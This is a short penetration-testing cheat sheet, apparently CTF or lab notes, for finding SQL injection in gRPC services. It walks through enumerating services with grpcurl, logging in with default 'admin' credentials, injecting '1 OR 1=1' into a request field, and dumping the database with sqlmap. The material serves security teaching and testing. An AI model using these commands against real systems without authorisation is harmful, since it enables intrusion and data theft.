# gRPC SQL Injection

gRPC services (default port 50051) expose RPC endpoints that may be vulnerable to SQL injection in their parameters. Use `grpcurl` or `grpcui` to enumerate and test endpoints.

## Install grpcurl

```bash
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
# Binary in $GOPATH/bin/grpcurl
```

## Enumerate Service

```bash
# List services (plaintext — no TLS)
grpcurl -plaintext <TARGET>:50051 list

# List methods on a service
grpcurl -plaintext <TARGET>:50051 list <ServiceName>

# Describe the full service
grpcurl -plaintext <TARGET>:50051 describe <ServiceName>

# Describe a request type
grpcurl -plaintext <TARGET>:50051 describe .<RequestType>
```

## Interact with Methods

```bash
# Login / register
grpcurl -plaintext -d '{"username":"admin","password":"admin"}' \
  <TARGET>:50051 <ServiceName>.LoginUser

# Call a method with a JWT token header
grpcurl -plaintext \
  -H "token: <JWT_TOKEN>" \
  -d '{"id":"1"}' \
  <TARGET>:50051 <ServiceName>.getInfo
```

## SQL Injection in Parameter

```bash
# Test SQL injection in id/username field
grpcurl -plaintext \
  -H "token: <JWT>" \
  -d '{"id":"1 OR 1=1"}' \
  <TARGET>:50051 <ServiceName>.getInfo

# Use sqlmap with a saved request (capture via grpcui or proxy)
sqlmap -r grpc_request.txt --dump
```

## grpcui (GUI alternative)

```bash
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
grpcui -plaintext <TARGET>:50051
# Opens browser UI for interactive testing
```

## Notes
- Default port: 50051; no TLS = use `-plaintext`; with TLS omit the flag
- Reflection (`grpc.reflection.v1alpha.ServerReflection`) must be enabled to enumerate
- SQLite errors in responses indicate backend DB type
- JWT tokens from login responses — try them in subsequent calls requiring auth
